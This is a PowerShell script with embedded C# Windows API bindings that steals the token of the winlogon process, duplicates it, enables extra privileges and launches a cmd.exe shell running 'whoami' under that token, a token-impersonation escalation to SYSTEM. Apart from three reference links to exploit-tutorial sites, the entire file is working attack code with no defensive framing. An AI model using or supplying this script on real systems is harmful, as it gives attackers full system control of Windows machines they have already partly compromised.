# Extremely useful information sources
# http://www.fuzzysecurity.com/tutorials/24.html
# http://stackoverflow.com/questions/27362404/createprocessasuser-gives-a-required-privilege-is-not-held-by-the-client-whi
# http://www.exploit-monday.com/2016/01/properly-retrieving-win32-api-error.html

Add-Type -TypeDefinition @"

	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;

	public static class WinBase {
	
		[StructLayout(LayoutKind.Sequential)]
		public struct SECURITY_ATTRIBUTES
		{
			public int nLength;
			public IntPtr lpSecurityDescriptor;
			public int bInheritHandle;
		}
	
		[StructLayout(LayoutKind.Sequential)]
		public struct STARTUPINFO
		{
			 public Int32 cb;
			 public string lpReserved;
			 public string lpDesktop;
			 public string lpTitle;
			 public Int32 dwX;
			 public Int32 dwY;
			 public Int32 dwXSize;
			 public Int32 dwYSize;
			 public Int32 dwXCountChars;
			 public Int32 dwYCountChars;
			 public Int32 dwFillAttribute;
			 public Int32 dwFlags;
			 public Int16 wShowWindow;
			 public Int16 cbReserved2;
			 public IntPtr lpReserved2;
			 public IntPtr hStdInput;
			 public IntPtr hStdOutput;
			 public IntPtr hStdError;
		}
	
		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_INFORMATION 
		{
		   public IntPtr hProcess;
		   public IntPtr hThread;
		   public int dwProcessId;
		   public int dwThreadId;
		}		
	}
	
	public static class WinNT {
		public const Int32 ANYSIZE_ARRAY = 1;
		public const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
		public const string SE_AUDIT_NAME = "SeAuditPrivilege";
		public const string SE_BACKUP_NAME = "SeBackupPrivilege";
		public const string SE_CHANGE_NOTIFY_NAME = "SeChangeNotifyPrivilege";
		public const string SE_CREATE_GLOBAL_NAME = "SeCreateGlobalPrivilege";
		public const string SE_CREATE_PAGEFILE_NAME = "SeCreatePagefilePrivilege";
		public const string SE_CREATE_PERMANENT_NAME = "SeCreatePermanentPrivilege";
		public const string SE_CREATE_SYMBOLIC_LINK_NAME = "SeCreateSymbolicLinkPrivilege";
		public const string SE_CREATE_TOKEN_NAME = "SeCreateTokenPrivilege";
		public const string SE_DEBUG_NAME = "SeDebugPrivilege";
		public const string SE_ENABLE_DELEGATION_NAME = "SeEnableDelegationPrivilege";
		public const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
		public const string SE_INC_BASE_PRIORITY_NAME = "SeIncreaseBasePriorityPrivilege";
		public const string SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege";
		public const string SE_INC_WORKING_SET_NAME = "SeIncreaseWorkingSetPrivilege";
		public const string SE_LOAD_DRIVER_NAME = "SeLoadDriverPrivilege";
		public const string SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege";
		public const string SE_MACHINE_ACCOUNT_NAME = "SeMachineAccountPrivilege";
		public const string SE_MANAGE_VOLUME_NAME = "SeManageVolumePrivilege";
		public const string SE_PROF_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege";
		public const string SE_RELABEL_NAME = "SeRelabelPrivilege";
		public const string SE_REMOTE_SHUTDOWN_NAME = "SeRemoteShutdownPrivilege";
		public const string SE_RESTORE_NAME = "SeRestorePrivilege";
		public const string SE_SECURITY_NAME = "SeSecurityPrivilege";
		public const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
		public const string SE_SYNC_AGENT_NAME = "SeSyncAgentPrivilege";
		public const string SE_SYSTEM_ENVIRONMENT_NAME = "SeSystemEnvironmentPrivilege";
		public const string SE_SYSTEM_PROFILE_NAME = "SeSystemProfilePrivilege";
		public const string SE_SYSTEMTIME_NAME = "SeSystemtimePrivilege";
		public const string SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege";
		public const string SE_TCB_NAME = "SeTcbPrivilege";
		public const string SE_TIME_ZONE_NAME = "SeTimeZonePrivilege";
		public const string SE_TRUSTED_CREDMAN_ACCESS_NAME = "SeTrustedCredManAccessPrivilege";
		public const string SE_UNDOCK_NAME = "SeUndockPrivilege";
		public const string SE_UNSOLICITED_INPUT_NAME = "SeUnsolicitedInputPrivilege";
		
		public enum TOKEN_TYPE {
			TokenPrimary = 1,
			TokenImpersonation
		}
		
		public enum SECURITY_IMPERSONATION_LEVEL
		{
			SecurityAnonymous,
			SecurityIdentification,
			SecurityImpersonation,
			SecurityDelegation
		}
		
		[StructLayout(LayoutKind.Sequential)]
		public struct LUID {
			public uint LowPart;
			public int HighPart;
		}
		
		[StructLayout(LayoutKind.Sequential, Pack = 4)]
		public struct LUID_AND_ATTRIBUTES {
			public LUID Luid;
			public UInt32 Attributes;
		}
		
		public struct TOKEN_PRIVILEGES {
			public UInt32 PrivilegeCount;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst=WinNT.ANYSIZE_ARRAY)]
			public LUID_AND_ATTRIBUTES [] Privileges;
		}
	}
	public static class Advapi32
	{
		public const int SE_PRIVILEGE_ENABLED = 0x00000002;
		public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
		public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
		public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
		public const UInt32 TOKEN_DUPLICATE = 0x0002;
		public const UInt32 TOKEN_IMPERSONATE = 0x0004;
		public const UInt32 TOKEN_QUERY = 0x0008;
		public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
		public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
		public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
		public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
		public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
		public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
		public const UInt32 TOKEN_ALL_ACCESS = (
			STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE |
			TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES |
			TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID
		);
	
		[Flags]
		public enum CreateProcessFlags : uint
		{
			DEBUG_PROCESS			   = 0x00000001,
			DEBUG_ONLY_THIS_PROCESS		 = 0x00000002,
			CREATE_SUSPENDED			= 0x00000004,
			DETACHED_PROCESS			= 0x00000008,
			CREATE_NEW_CONSOLE		  = 0x00000010,
			NORMAL_PRIORITY_CLASS		   = 0x00000020,
			IDLE_PRIORITY_CLASS		 = 0x00000040,
			HIGH_PRIORITY_CLASS		 = 0x00000080,
			REALTIME_PRIORITY_CLASS		 = 0x00000100,
			CREATE_NEW_PROCESS_GROUP		= 0x00000200,
			CREATE_UNICODE_ENVIRONMENT	  = 0x00000400,
			CREATE_SEPARATE_WOW_VDM		 = 0x00000800,
			CREATE_SHARED_WOW_VDM		   = 0x00001000,
			CREATE_FORCEDOS			 = 0x00002000,
			BELOW_NORMAL_PRIORITY_CLASS	 = 0x00004000,
			ABOVE_NORMAL_PRIORITY_CLASS	 = 0x00008000,
			INHERIT_PARENT_AFFINITY		 = 0x00010000,
			INHERIT_CALLER_PRIORITY		 = 0x00020000,
			CREATE_PROTECTED_PROCESS		= 0x00040000,
			EXTENDED_STARTUPINFO_PRESENT	= 0x00080000,
			PROCESS_MODE_BACKGROUND_BEGIN	   = 0x00100000,
			PROCESS_MODE_BACKGROUND_END	 = 0x00200000,
			CREATE_BREAKAWAY_FROM_JOB	   = 0x01000000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL	= 0x02000000,
			CREATE_DEFAULT_ERROR_MODE	   = 0x04000000,
			CREATE_NO_WINDOW			= 0x08000000,
			PROFILE_USER			= 0x10000000,
			PROFILE_KERNEL			  = 0x20000000,
			PROFILE_SERVER			  = 0x40000000,
			CREATE_IGNORE_SYSTEM_DEFAULT	= 0x80000000,
		}
	
		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			UInt32 DesiredAccess, 
			out IntPtr TokenHandle
		);
		
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public extern static bool DuplicateTokenEx(
			IntPtr hExistingToken,
			uint dwDesiredAccess,
			ref WinBase.SECURITY_ATTRIBUTES lpTokenAttributes,
			WinNT.SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
			WinNT.TOKEN_TYPE TokenType,
			out IntPtr phNewToken
		);
		
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern  bool LookupPrivilegeValue(
			string lpSystemName, 
			string lpName,
			out WinNT.LUID lpLuid
		);
		
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool AdjustTokenPrivileges(
			IntPtr TokenHandle, 
			[MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges, 
			ref WinNT.TOKEN_PRIVILEGES NewState, 
			UInt32 Zero,
			IntPtr Null1, 
			IntPtr Null2
		);
		
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool ImpersonateLoggedOnUser(
			IntPtr hToken
		);
		
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool CreateProcessAsUser(
			IntPtr hToken,
			string lpApplicationName,
			string lpCommandLine,
			ref WinBase.SECURITY_ATTRIBUTES lpProcessAttributes,
			ref WinBase.SECURITY_ATTRIBUTES lpThreadAttributes,
			bool bInheritHandles,
			uint dwCreationFlags,
			IntPtr lpEnvironment,
			string lpCurrentDirectory,
			ref WinBase.STARTUPINFO lpStartupInfo,
			out WinBase.PROCESS_INFORMATION lpProcessInformation
		);
	}
	public static class Kernel32
	{
		[Flags]
		public enum ProcessAccessFlags : uint
		{
			All = 0x001F0FFF,
			Terminate = 0x00000001,
			CreateThread = 0x00000002,
			VirtualMemoryOperation = 0x00000008,
			VirtualMemoryRead = 0x00000010,
			VirtualMemoryWrite = 0x00000020,
			DuplicateHandle = 0x00000040,
			CreateProcess = 0x000000080,
			SetQuota = 0x00000100,
			SetInformation = 0x00000200,
			QueryInformation = 0x00000400,
			QueryLimitedInformation = 0x00001000,
			Synchronize = 0x00100000
		}
	
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(
			ProcessAccessFlags processAccess,
			bool bInheritHandle,
			int processId
		);
	}
	public static class Userenv {
		[DllImport("userenv.dll", SetLastError = true)]
		public static extern bool CreateEnvironmentBlock(
			ref IntPtr lpEnvironment,
			IntPtr hToken,
			bool bInherit
		);
	}
"@


$PPID = (Get-Process -Name winlogon).Id


$ProcessHandle = [Kernel32]::OpenProcess([Kernel32+ProcessAccessFlags]::All, $True, $PPID)
$DesiredAccess = [Advapi32]::TOKEN_QUERY -BOr [Advapi32]::TOKEN_DUPLICATE -BOr [Advapi32]::TOKEN_ASSIGN_PRIMARY
$ProcessToken = New-Object -TypeName System.IntPtr
[Advapi32]::OpenProcessToken($ProcessHandle, $DesiredAccess, [Ref] $ProcessToken) | Out-Null


$DesiredAccess = [Advapi32]::TOKEN_ALL_ACCESS
$SecurityAttributes = New-Object -TypeName WinBase+SECURITY_ATTRIBUTES
$SecurityAttributes.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($SecurityAttributes)
$ImpersonationLevel = [WinNT+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation
$TokenType = [WinNT+TOKEN_TYPE]::TokenPrimary
$DuplicatedProcessToken = New-Object -TypeName System.IntPtr

[Advapi32]::DuplicateTokenEx($ProcessToken, $DesiredAccess, [Ref] $SecurityAttributes, $ImpersonationLevel, $TokenType, [Ref] $DuplicatedProcessToken) | Out-Null






$NewTokenPrivleges = New-Object -TypeName WinNT+TOKEN_PRIVILEGES
$AssignPrimaryTokenLUID = New-Object -TypeName WinNT+LUID
$IncreaseQuotaNameLUID = New-Object -TypeName WinNT+LUID
$AssignPrimaryTokenLUIDAndAttributes = New-Object -TypeName WinNT+LUID_AND_ATTRIBUTES
$IncreaseQuotaNameLUIDAndAttributes = New-Object -TypeName WinNT+LUID_AND_ATTRIBUTES

[Advapi32]::LookupPrivilegeValue("", [WinNT]::SE_ASSIGNPRIMARYTOKEN_NAME, [Ref] $AssignPrimaryTokenLUID) | Out-Null
[Advapi32]::LookupPrivilegeValue("", [WinNT]::SE_INCREASE_QUOTA_NAME, [Ref] $IncreaseQuotaNameLUID) | Out-Null

$AssignPrimaryTokenLUIDAndAttributes.Luid = $AssignPrimaryTokenLUID
$IncreaseQuotaNameLUIDAndAttributes.Luid = $IncreaseQuotaNameLUID
$AssignPrimaryTokenLUIDAndAttributes.Attributes = [Advapi32]::SE_PRIVILEGE_ENABLED
$IncreaseQuotaNameLUIDAndAttributes.Attributes = [Advapi32]::SE_PRIVILEGE_ENABLED

$NewTokenPrivleges.Privileges = @($AssignPrimaryTokenLUIDAndAttributes, $IncreaseQuotaNameLUIDAndAttributes)
$NewTokenPrivleges.PrivilegeCount = $NewTokenPrivleges.Privileges.Length

[Advapi32]::AdjustTokenPrivileges($DuplicatedProcessToken, $False, [Ref] $NewTokenPrivleges, 0, [System.IntPtr]::Zero, [System.IntPtr]::Zero) | Out-Null



[Advapi32]::ImpersonateLoggedOnUser($DuplicatedProcessToken) | Out-Null



$ProcessCreationFlags = [Advapi32+CreateProcessFlags]::CREATE_BREAKAWAY_FROM_JOB -BOr [Advapi32+CreateProcessFlags]::CREATE_NEW_CONSOLE
$ProcessStartupInfo = New-Object -TypeName WinBase+STARTUPINFO
$ProcessStartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($ProcessStartupInfo)

$ProcessInformation = New-Object -TypeName WinBase+PROCESS_INFORMATION
$ProcessSecurityAttributes = New-Object -TypeName WinBase+SECURITY_ATTRIBUTES
$ThreadSecurityAttributes = New-Object -TypeName WinBase+SECURITY_ATTRIBUTES
$ProcessSecurityAttributes.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($ProcessSecurityAttributes)
$ThreadSecurityAttributes.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($ThreadSecurityAttributes)

$Environment = New-Object -TypeName System.IntPtr
[Userenv]::CreateEnvironmentBlock([Ref] $Environment, $DuplicatedProcessToken, $False) | Out-Null



[Advapi32]::CreateProcessAsUser($DuplicatedProcessToken, "C:\Windows\system32\cmd.exe", "/K whoami", [Ref] $ProcessSecurityAttributes, [Ref] $ThreadSecurityAttributes, $False, $ProcessCreationFlags, [IntPtr]::Zero, "C:\", [Ref] $ProcessStartupInfo, [Ref] $ProcessInformation) | Out-Null